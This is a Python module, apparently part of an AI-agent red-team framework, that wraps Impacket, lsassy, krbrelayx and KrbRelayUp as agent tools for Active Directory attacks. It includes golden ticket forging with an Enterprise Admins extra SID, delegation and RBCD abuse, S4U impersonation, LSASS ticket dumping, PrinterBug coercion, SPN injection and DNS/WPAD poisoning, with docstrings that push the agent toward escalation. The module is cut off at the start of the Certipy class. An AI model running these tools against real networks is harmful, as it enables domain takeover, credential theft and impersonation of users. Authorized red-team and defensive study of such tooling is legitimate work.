"""Red Team Kerberos and certificate-based attack tools.

This module provides toolsets for:
- Golden ticket generation
- Delegation attacks (constrained/unconstrained/RBCD)
- AD CS exploitation (Certipy)
- Trust relationship attacks
"""

import re
import shlex
import uuid
from datetime import datetime, timezone
from typing import ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.core.models import Hash, SharedRedTeamState, TimelineEvent, VulnerabilityInfo
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    format_weakness_block,
    get_credential_context,
    resolve_password,
    run_tool,
    set_credential_context,
)


class GoldenTicketTools(Toolset):
    """Tools for Kerberos golden ticket generation and domain escalation."""

    state: SharedRedTeamState | None = None

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Get the SID (Security Identifier) of a domain.

        This is required for golden ticket generation. You need to get SIDs for BOTH:
        1. The compromised domain (where you have the krbtgt hash)
        2. The target domain (where you want to escalate)

        Args:
            domain: Target domain (e.g., 'child.contoso.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)

        Returns:
            Domain SID and list of domain users (look for "[*] Domain SID is: ...")

        Example:
            >>> get_sid("child.contoso.local", "user", "pass", "192.168.58.100")
            >>> get_sid("contoso.local", "user", "pass", "192.168.58.101")
        """
        if dc_ip:
            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
            logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
        else:
            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
            logger.info(f"[*] Getting SID for {domain} using {username}")

        try:
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            logger.info(f"[*] SID lookup completed for {domain}")
            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"

    @dn.tool_method
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a Kerberos golden ticket for Administrator to enable domain escalation.

        **This is the ULTIMATE privilege escalation technique.** A golden ticket gives
        you persistent, enterprise-level access to the entire domain forest.

        CRITICAL: The extra_sid should be the target domain SID with "-519" appended
        (Enterprise Admins group). This enables cross-domain privilege escalation.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account (from secretsdump)
            domain_sid: SID of the compromised domain (from get_sid)
            domain: Domain to generate ticket for (same as domain_sid domain)
            extra_sid: Target domain SID with "-519" appended (Enterprise Admins)

        Returns:
            Golden ticket generation output (saves to Administrator.ccache)

        Example:
            >>> generate_golden_ticket(
            ...     "abc123...",  # krbtgt hash
            ...     "S-1-5-21-123-456-789",  # compromised domain SID
            ...     "child.contoso.local",  # compromised domain
            ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
            ... )
        """
        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.warning(
                f"🎫 GOLDEN TICKET GENERATION: Child-to-parent escalation via extra-sid\n"
                f"   Source domain: {domain}\n"
                f"   Source SID: {domain_sid}\n"
                f"   Extra SID (EA): {extra_sid}\n"
                f"   User: Administrator"
            )
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            result = stdout or stderr or ""

            if ".ccache" in result.lower() or "saved to" in result.lower():
                logger.warning(
                    f"🎯 GOLDEN TICKET CREATED!\n"
                    f"   Domain: {domain}\n"
                    f"   Ticket: Administrator.ccache\n"
                    f"   Access: Enterprise Admin via extra-sid {extra_sid}"
                )

            if self.state:
                self.state.has_golden_ticket = True
                if hasattr(self.state, "timeline"):
                    event = TimelineEvent(
                        id=f"evt-{len(self.state.timeline):04d}",
                        timestamp=datetime.now(timezone.utc),
                        description=f"Golden ticket generated for {domain}",
                        mitre_techniques=["T1558.001"],
                        confidence=1.0,
                        source="golden_ticket_generation",
                    )
                    self.state.timeline.append(event)

            return result
        except Exception as e:
            return f"Error: {e!s}"


class DelegationTools(Toolset):
    """Tools for discovering and exploiting Kerberos delegation vulnerabilities."""

    state: SharedRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _extract_delegation_users(self, output: str, domain: str) -> int:
        """Extract user accounts from delegation output and add to state.

        Parses impacket-findDelegation output format:
            AccountName    AccountType    DelegationType                   DelegationRightsTo
            -----------    -----------    ---------------                  ------------------
            svc.sql        Person         Constrained w/ Protocol Trans.   cifs/dc01
            DC01$          Computer       Unconstrained                    N/A

        Only adds Person accounts (not Computer accounts ending in $).

        Args:
            output: Raw output from impacket-findDelegation
            domain: Domain where delegation was found

        Returns:
            Number of users added
        """
        if not self.state or not output:
            return 0

        added = 0
        in_table = False

        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue

            lower = stripped.lower()

            # Detect table header
            if "accountname" in lower and "delegationtype" in lower:
                in_table = True
                continue

            # Skip separator lines (dashes)
            if in_table and set(stripped) <= {"-", " "}:
                continue

            # Stop at non-table content
            if in_table and stripped.startswith(("[", "Impacket")):
                in_table = False
                continue

            if not in_table:
                continue

            # Parse table row
            parts = stripped.split()
            if len(parts) < 2:
                continue

            account = parts[0]
            account_type = parts[1].lower() if len(parts) > 1 else ""

            # Only add person accounts (not machine accounts)
            if account.endswith("$") or account_type == "computer":
                continue

            # Add user to state
            if hasattr(self.state, "add_user") and self.state.add_user(
                account, domain, source="find_delegation"
            ):
                added += 1
                logger.debug(f"Added delegation user: {domain}\\{account}")

        if added > 0:
            logger.info(f"[+] Added {added} user(s) from delegation discovery")

        return added

    def _parse_delegation_output(self, output: str) -> list[dict[str, str]]:
        """Parse impacket-findDelegation output into structured delegation entries.

        Args:
            output: Raw output from impacket-findDelegation

        Returns:
            List of dicts with: account, account_type, delegation_type, target_spn
        """
        delegations: list[dict[str, str]] = []
        if not output:
            return delegations

        in_table = False
        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue

            lower = stripped.lower()

            # Detect table header
            if "accountname" in lower and "delegationtype" in lower:
                in_table = True
                continue

            # Skip separator lines
            if in_table and set(stripped) <= {"-", " "}:
                continue

            # Stop at non-table content
            if in_table and stripped.startswith(("[", "Impacket")):
                break

            if not in_table:
                continue

            # Parse table row: AccountName AccountType DelegationType DelegationRightsTo [SPN Exists]
            # Columns: https://github.com/fortra/impacket/blob/master/examples/findDelegation.py
            # Last column "SPN Exists" is Yes/No/- which we skip
            parts = stripped.split()
            if len(parts) < 3:
                continue

            account = parts[0]
            account_type = parts[1].lower()

            # Strip "SPN Exists" column if present (Yes/No/-)
            if parts[-1].lower() in ("yes", "no", "-"):
                parts = parts[:-1]

            # Now last element is DelegationRightsTo (the target SPN)
            # DelegationType is everything between account_type and target_spn
            target_spn = parts[-1] if len(parts) > 3 else "N/A"
            delegation_type_raw = " ".join(parts[2:-1]) if len(parts) > 3 else parts[2]

            # Normalize delegation type
            if "unconstrained" in delegation_type_raw.lower():
                delegation_type = "unconstrained"
            elif "constrained" in delegation_type_raw.lower():
                delegation_type = "constrained"
            else:
                delegation_type = delegation_type_raw.lower()

            delegations.append(
                {
                    "account": account,
                    "account_type": account_type,
                    "delegation_type": delegation_type,
                    "target_spn": target_spn,
                }
            )

        return delegations

    def _add_delegation_vulnerability(
        self,
        account: str,
        delegation_type: str,
        target_spn: str,
        domain: str,
        dc_ip: str,
    ) -> bool:
        """Add a delegation vulnerability to state for auto-exploitation.

        Args:
            account: Account with delegation (e.g., svc.sql or DC01$)
            delegation_type: "constrained" or "unconstrained"
            target_spn: Target SPN for constrained delegation (e.g., cifs/dc01)
            domain: Domain name
            dc_ip: Domain controller IP

        Returns:
            True if vulnerability was added, False if skipped/duplicate
        """
        if not isinstance(self.state, SharedRedTeamState):
            logger.debug("State does not support add_vulnerability (not SharedRedTeamState)")
            return False

        account_clean = account.rstrip("$")
        vuln_type = f"{delegation_type}_delegation"
        vuln_key = f"{vuln_type}:{account_clean.lower()}"

        # Check for duplicate
        for v in self.state.discovered_vulnerabilities.values():
            existing_key = f"{v.vuln_type}:{v.target.lower()}"
            if existing_key == vuln_key:
                logger.debug(f"Delegation vulnerability already exists: {vuln_key}")
                return False

        # Check if we have credentials for this account
        has_creds = False
        account_lower = account_clean.lower()
        for cred in self.state.all_credentials:
            cred_user = cred.username.lower().rstrip("$")
            if cred_user == account_lower and cred.password:
                has_creds = True
                break
        # Also check hashes
        if not has_creds:
            for h in self.state.all_hashes:
                hash_user = h.username.lower().rstrip("$")
                if hash_user == account_lower:
                    has_creds = True
                    break

        details = {
            "account": account,
            "account_name": account_clean,
            "delegation_type": delegation_type,
            "target_spn": target_spn,
            "domain": domain,
            "dc_ip": dc_ip,
            "has_credentials": has_creds,
        }

        # Priority based on config or defaults
        priority = 8 if delegation_type == "constrained" else 7

        vuln = VulnerabilityInfo(
            vuln_id=f"{vuln_type}_{account_clean.lower()}_{uuid.uuid4().hex[:8]}",
            vuln_type=vuln_type,
            target=account_clean,
            discovered_by="find_delegation",
            details=details,
            priority=priority,
            recommended_agent="privesc",
        )

        self.state.discovered_vulnerabilities[vuln.vuln_id] = vuln
        cred_status = "✓ has credentials" if has_creds else "✗ no credentials yet"
        logger.warning(
            f"🎫 Delegation vulnerability queued: {vuln_type} for {account} "
            f"(target: {target_spn}, {cred_status})"
        )
        return True

    @dn.tool_method
    def find_delegation(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Find all accounts with Kerberos delegation configured.

        Delegation is often exploitable for privilege escalation:
        - Unconstrained: Can impersonate ANY user to ANY service
        - Constrained: Can impersonate ANY user to specific services
        - RBCD: Resource-Based Constrained Delegation for SYSTEM access

        CRITICAL: Run this early - delegation misconfigs are common high-value targets.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            List of accounts with delegation and delegation type

        Example:
            >>> find_delegation("contoso.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Searching for delegation in {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            # Extract accounts from delegation output and add to users
            self._extract_delegation_users(result, domain)

            # Parse and queue delegation vulnerabilities for auto-exploitation
            delegations = self._parse_delegation_output(result)
            queued = 0
            for deleg in delegations:
                if self._add_delegation_vulnerability(
                    account=deleg["account"],
                    delegation_type=deleg["delegation_type"],
                    target_spn=deleg["target_spn"],
                    domain=domain,
                    dc_ip=dc_ip,
                ):
                    queued += 1
            if queued > 0:
                logger.info(f"[+] Queued {queued} delegation vulnerability(ies) for exploitation")

            if "unconstrained" in result.lower():
                logger.info("[!] Unconstrained delegation found!")
                result = (
                    "🚨 UNCONSTRAINED DELEGATION DETECTED!\n"
                    "\u2192 Compromise this account to impersonate ANY user\n"
                    "\u2192 Use Rubeus/mimikatz to harvest TGTs\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Unconstrained Delegation",
                    "Unconstrained delegation configured on account",
                    {},
                    "Allows impersonation of any user",
                    "Delegation enumeration",
                )
                self._add_weakness(block)
            elif "constrained" in result.lower():
                logger.info("[+] Constrained delegation found")
                result = (
                    "🔗 CONSTRAINED DELEGATION DETECTED:\n"
                    "\u2192 Can impersonate users to specific services\n"
                    "\u2192 Check for S4U2Self abuse opportunities\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Constrained Delegation",
                    "Constrained delegation configured on account",
                    {},
                    "Allows impersonation to specific services",
                    "Delegation enumeration",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Delegation search failed: {e}"

    @dn.tool_method
    def rbcd_write(
        self,
        target_computer: str,
        attacker_sid: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Write Resource-Based Constrained Delegation (RBCD) to gain SYSTEM access.

        RBCD abuse allows gaining SYSTEM access when you have GenericWrite on a computer.
        After running this, use S4U2Self/S4U2Proxy to get a service ticket as Administrator.

        Attack chain:
        1. Create/control a machine account (add_computer)
        2. Write RBCD from controlled account to target (this tool)
        3. Use S4U to get Admin ticket
        4. Psexec with ticket

        Args:
            target_computer: Computer to write RBCD on (what you want SYSTEM on)
            attacker_sid: SID of the attacker-controlled account
            domain: Target domain
            username: Username with GenericWrite on target_computer
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            RBCD write result

        Example:
            >>> rbcd_write("TARGETPC$", "S-1-5-21-...-1234", "contoso.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "rbcd.py",
            "-delegate-to",
            target_computer,
            "-delegate-from",
            attacker_sid,
            "-action",
            "write",
            "-dc-ip",
            dc_ip,
            f"{domain}/{username}:{resolved_password}",
        ]

        try:
            logger.info(f"[*] Writing RBCD on {target_computer}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "attribute already" in result.lower():
                logger.info("[+] RBCD delegation written successfully!")
                result = (
                    "\u2705 RBCD DELEGATION WRITTEN!\n"
                    "\u2192 Now use S4U2Self to request ticket as Administrator\n"
                    "\u2192 Then use ticket with psexec for SYSTEM access\n\n" + result
                )

            return result

        except Exception as e:
            return f"RBCD write failed: {e}"

    @dn.tool_method
    def s4u_attack(
        self,
        target_spn: str,
        impersonate: str,
        domain: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        dc_ip: str | None = None,
    ) -> str:
        """
        Perform S4U2Self/S4U2Proxy attack to impersonate users via delegation.

        After setting up RBCD or finding constrained delegation, use this to get
        a service ticket as any user (typically Administrator) to the target service.

        Args:
            target_spn: Target SPN to get ticket for (e.g., 'cifs/TARGETPC.contoso.local')
            impersonate: User to impersonate (typically 'Administrator')
            domain: Target domain
            username: Username of account with delegation rights
            password: Password (optional if using hash)
            hash: NTLM hash (optional if using password)
            dc_ip: Domain controller IP (optional)

        Returns:
            S4U attack result (includes .ccache ticket path if successful)

        Example:
            >>> s4u_attack("cifs/TARGETPC.contoso.local", "Administrator", "contoso.local", "svc_account", password="pass")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if resolved_password:
            target_string = f"{domain}/{username}:{resolved_password}"
        elif hash:
            target_string = f"{domain}/{username}"
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd = [
            "impacket-getST",
            "-spn",
            target_spn,
            "-impersonate",
            impersonate,
            target_string,
        ]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        try:
            logger.info(f"[*] Performing S4U attack to impersonate {impersonate}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".ccache" in result:
                logger.info("[+] S4U attack successful - ticket obtained!")
                result = (
                    "🎫 S4U ATTACK SUCCESSFUL!\n"
                    "\u2192 Service ticket obtained for impersonated user\n"
                    "\u2192 Set KRB5CCNAME=<ticket.ccache> and use with psexec\n\n" + result
                )

                # Update credential context for attack chain tracking
                # Find the source credential's ID to establish parent linkage
                source_cred_id = None
                current_ctx = get_credential_context()
                current_step = current_ctx.attack_step

                if self.state:
                    # Look up the credential used for S4U
                    for cred in self.state.credentials:
                        if (
                            cred.username.lower() == username.lower()
                            and cred.domain.lower() == domain.lower()
                        ):
                            source_cred_id = cred.id
                            current_step = cred.attack_step
                            break

                    # If not found in credentials, check hashes (may have used hash)
                    if not source_cred_id and hash:
                        for h in getattr(self.state, "all_hashes", self.state.hashes):
                            if (
                                h.username.lower() == username.lower()
                                and h.domain.lower() == domain.lower()
                            ):
                                source_cred_id = h.id
                                current_step = h.attack_step
                                break

                # Update context so subsequent tools (secretsdump) know the lineage
                set_credential_context(
                    parent_id=source_cred_id,
                    attack_step=current_step + 1,
                    source_username=username,
                    source_domain=domain,
                    impersonated_user=impersonate,
                    impersonation_method="s4u_attack",
                )
                logger.debug(
                    f"Credential context updated: S4U as {impersonate} "
                    f"via {domain}\\{username} (parent_id={source_cred_id})"
                )

            return result

        except Exception as e:
            return f"S4U attack failed: {e}"

    @dn.tool_method
    def add_computer(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        computer_name: str = "",
        computer_password: str = "",
    ) -> str:
        """
        Add a machine account to the domain (default MachineAccountQuota = 10).

        Machine accounts can be used for RBCD attacks or Kerberos delegation abuse.
        Most domains allow any authenticated user to add up to 10 machine accounts.

        Args:
            domain: Target domain
            username: Any valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            computer_name: Name for the new computer (auto-generated if empty)
            computer_password: Password for the computer (auto-generated if empty)

        Returns:
            Computer creation result with credentials

        Example:
            >>> add_computer("contoso.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if not computer_name:
            computer_name = f"EVIL{uuid.uuid4().hex[:6].upper()}$"
        if not computer_password:
            computer_password = f"Password{uuid.uuid4().hex[:8]}!"

        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{resolved_password}",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_password,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Adding machine account {computer_name} to {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "already exists" in result.lower():
                logger.info(f"[+] Machine account {computer_name} added!")
                result = (
                    f"\u2705 MACHINE ACCOUNT CREATED!\n"
                    f"\u2192 Computer: {computer_name}\n"
                    f"\u2192 Password: {computer_password}\n"
                    "\u2192 Use this for RBCD attacks\n\n" + result
                )

            return result

        except Exception as e:
            return f"Add computer failed: {e}"

    @dn.tool_method
    def unconstrained_tgt_dump(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target_host: str,
    ) -> str:
        """
        Dump TGTs from LSASS on a host with unconstrained delegation.

        When you have code execution on a host with unconstrained delegation,
        use this to extract TGTs from LSASS. These TGTs can be used to
        impersonate the authenticated users.

        Attack workflow:
        1. Identify hosts with unconstrained delegation (find_delegation)
        2. Get code execution on the unconstrained host (psexec, wmiexec)
        3. Dump TGTs from LSASS (this tool)
        4. Use extracted TGTs for impersonation

        Args:
            domain: Target domain
            username: Admin username for remote execution
            password: Password for authentication
            dc_ip: Domain controller IP
            target_host: Host with unconstrained delegation

        Returns:
            Extracted TGTs and their details
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Use lsassy for remote TGT extraction
        cmd = [
            "lsassy",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password or "",
            target_host,
            "-m",
            "direct",  # Direct memory read
        ]

        try:
            logger.info(f"[*] Dumping TGTs from LSASS on {target_host}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)

            result = stdout + "\n" + (stderr or "")

            # Look for TGT indicators
            if "krbtgt" in result.lower() or "tgt" in result.lower():
                logger.warning("[!] TGTs found in LSASS dump!")
                result = (
                    "🎫 TGTs EXTRACTED FROM UNCONSTRAINED DELEGATION HOST!\n"
                    f"→ Host: {target_host}\n"
                    "→ Look for TGTs from privileged users (Domain Admins, DC$)\n"
                    "→ Use extracted tickets with pass-the-ticket\n"
                    "→ If DC$ TGT found: instant DA access!\n\n" + result
                )

            return result

        except Exception as e:
            return f"TGT dump failed: {e}"

    @dn.tool_method
    def unconstrained_coerce_and_capture(
        self,
        domain: str,
        username: str,
        password: str,
        target_host: str,
        coerce_from: str,
        listener_ip: str,
    ) -> str:
        """
        Coerce authentication to an unconstrained delegation host to capture TGT.

        When you have control of a host with unconstrained delegation, coerce
        a DC or privileged server to authenticate. The TGT will be cached in
        the unconstrained host's LSASS.

        Attack workflow:
        1. Get access to unconstrained delegation host
        2. Coerce DC to authenticate to the unconstrained host
        3. DC's TGT is cached in LSASS
        4. Extract TGT using unconstrained_tgt_dump
        5. Use DC TGT for DCSync

        Args:
            domain: Target domain
            username: Admin username on unconstrained host
            password: Password for authentication
            target_host: Host with unconstrained delegation (our controlled host)
            coerce_from: Host to coerce (typically a DC)
            listener_ip: IP where TGT will be captured (the unconstrained host)

        Returns:
            Coercion result and next steps
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Use SpoolSample/PrinterBug for coercion
        # krbrelayx printerbug.py syntax: domain/user:pass@target listener_ip
        cmd = [
            "printerbug.py",
            f"{domain}/{username}:{resolved_password}@{coerce_from}",
            listener_ip,
        ]

        try:
            logger.info(f"[*] Coercing {coerce_from} to authenticate to {listener_ip}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            return (
                f"🎯 COERCION TRIGGERED\n"
                f"→ Coerced {coerce_from} to authenticate to {listener_ip}\n"
                f"→ If {target_host} has unconstrained delegation:\n"
                f"   1. The TGT from {coerce_from} is now cached in LSASS\n"
                f"   2. Use unconstrained_tgt_dump to extract it\n"
                f"   3. Use the TGT for pass-the-ticket attacks\n\n"
                f"NEXT STEP:\n"
                f'   unconstrained_tgt_dump(target_host="{target_host}", ...)\n\n' + result
            )

        except Exception as e:
            return f"Coercion for unconstrained delegation failed: {e}"

    @dn.tool_method
    def krbrelayup(
        self,
        domain: str,
        dc_ip: str,
        method: str = "rbcd",
        create_user: str | None = None,
        create_password: str | None = None,
    ) -> str:
        """
        Local privilege escalation via Kerberos relay (KrbRelayUp).

        Relays Kerberos authentication from a local service to LDAP for
        RBCD or shadow credentials attack. Requires running on a compromised
        host with a service that performs Kerberos authentication.

        This is a LOCAL privilege escalation technique - run it ON the target
        machine, not remotely.

        Args:
            domain: Target domain (e.g., 'contoso.local')
            dc_ip: Domain controller IP address
            method: Attack method - 'rbcd' (default) or 'shadowcred'
            create_user: Computer account name to create (optional)
            create_password: Password for created computer account (optional)

        Returns:
            KrbRelayUp result including credentials if successful

        Example:
            >>> krbrelayup("contoso.local", "192.168.58.10")
            >>> krbrelayup("contoso.local", "192.168.58.10", method="shadowcred")
        """
        cmd = ["KrbRelayUp", "full", "-m", method, "-d", domain, "-dc", dc_ip]

        if create_user:
            cmd.extend(["-cn", create_user])
        if create_password:
            cmd.extend(["-cp", create_password])

        try:
            logger.info(f"[*] Running KrbRelayUp ({method}) against {domain}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            if returncode == 0 or "success" in result.lower():
                logger.warning(f"[+] KrbRelayUp successful via {method}!")
                result = (
                    f"🚨 KRBRELAYUP SUCCESSFUL!\n"
                    f"→ Local privesc via {method}\n"
                    "→ Check output for credentials/tickets\n"
                    "→ Use obtained access for lateral movement\n\n" + result
                )

            return result

        except Exception as e:
            return f"KrbRelayUp failed: {e}"

    @dn.tool_method
    def addspn(
        self,
        target_account: str,
        spn: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        action: str = "add",
    ) -> str:
        """
        Add or remove Service Principal Names (SPNs) on target accounts.

        SPNs are required for Kerberoasting - adding an SPN to a user account
        makes it targetable for Kerberos TGS extraction. This is useful for:
        - Setting up targeted Kerberoast attacks on high-value accounts
        - Preparing accounts for constrained delegation attacks

        Args:
            target_account: Account to modify (e.g., 'svc_admin' or 'svc_admin$')
            spn: SPN to add (e.g., 'http/evil.contoso.local')
            domain: Target domain
            username: User with write permissions on target account
            password: Password for authentication
            dc_ip: Domain controller IP
            action: 'add' to add SPN, 'remove' to remove it

        Returns:
            Result of SPN modification

        Example:
            >>> addspn("svc_admin", "http/evil.contoso.local", "contoso.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # addspn.py from krbrelayx toolkit
        cmd = [
            "python3",
            "/opt/krbrelayx/addspn.py",
            "-u",
            f"{domain}/{username}",
            "-p",
            resolved_password or "",
            "-t",
            target_account,
            "-s",
            spn,
            "--dc-ip",
            dc_ip,
        ]

        if action.lower() == "remove":
            cmd.append("--remove")

        try:
            action_str = "Adding" if action.lower() != "remove" else "Removing"
            logger.info(f"[*] {action_str} SPN {spn} on {target_account}")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if returncode == 0 or "success" in result.lower():
                logger.info(f"[+] SPN modification successful: {spn} on {target_account}")
                if action.lower() != "remove":
                    result = (
                        f"✅ SPN ADDED: {spn} on {target_account}\n"
                        f"→ Account is now Kerberoastable\n"
                        f"→ Use kerberoast to extract TGS hash\n"
                        f"→ Or use for delegation attacks\n\n" + result
                    )
                else:
                    result = f"✅ SPN REMOVED: {spn} from {target_account}\n\n" + result

            return result

        except Exception as e:
            return f"addspn failed: {e}"

    @dn.tool_method
    def dnstool(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
        record_name: str,
        record_data: str,
        record_type: str = "A",
        action: str = "add",
    ) -> str:
        """
        Add, modify, or remove DNS records in Active Directory DNS.

        DNS manipulation is essential for relay attacks - adding records that
        point to your listener enables NTLM coercion and relay scenarios.

        Common uses:
        - Add A record pointing to attacker IP for MITM
        - Set up WPAD records for proxy attacks
        - Create records for coercion attack destinations

        Args:
            dc_ip: Domain controller IP (DNS server)
            domain: Target domain
            username: User with DNS write permissions
            password: Password for authentication
            record_name: DNS record name (e.g., 'attacker' for attacker.contoso.local)
            record_data: Record data (IP for A records, hostname for CNAME)
            record_type: Record type - 'A' (default), 'AAAA', 'CNAME'
            action: 'add' to add, 'remove' to remove, 'modify' to update

        Returns:
            Result of DNS modification

        Example:
            >>> dnstool("192.168.58.10", "contoso.local", "user", "pass", "attacker", "192.168.58.50")
            >>> dnstool("192.168.58.10", "contoso.local", "user", "pass", "wpad", "192.168.58.50")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # dnstool.py from krbrelayx toolkit
        cmd = [
            "python3",
            "/opt/krbrelayx/dnstool.py",
            "-u",
            f"{domain}\\{username}",
            "-p",
            resolved_password or "",
            "-r",
            record_name,
            "-d",
            record_data,
            "-t",
            record_type.upper(),
            dc_ip,
        ]

        # Map action to dnstool flags
        if action.lower() == "add":
            cmd.append("-a")
            cmd.append("add")
        elif action.lower() == "remove":
            cmd.append("-a")
            cmd.append("delete")
        elif action.lower() == "modify":
            cmd.append("-a")
            cmd.append("modify")
        else:
            return f"[!] Unknown action: {action}. Use 'add', 'remove', or 'modify'."

        try:
            logger.info(
                f"[*] {action.title()} DNS {record_type} record: {record_name} -> {record_data}"
            )
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if returncode == 0 or "success" in result.lower():
                logger.info("[+] DNS record modification successful")
                if action.lower() == "add":
                    fqdn = f"{record_name}.{domain}" if "." not in record_name else record_name
                    result = (
                        f"✅ DNS RECORD ADDED\n"
                        f"→ {record_type} record: {fqdn} -> {record_data}\n"
                        f"→ Use this for relay attacks or coercion\n"
                        f"→ Start listener on {record_data} before coercing\n\n" + result
                    )

            return result

        except Exception as e:
            return f"dnstool failed: {e}"


class CertipyTools(Toolset):
    """Tools for AD Certificate Services (ADCS) enumeration and exploitation.

    These tools target common ADCS misconfigurations (ESC1-15) that can lead to
    domain admin privileges.
    """

    state: SharedRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: SharedRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
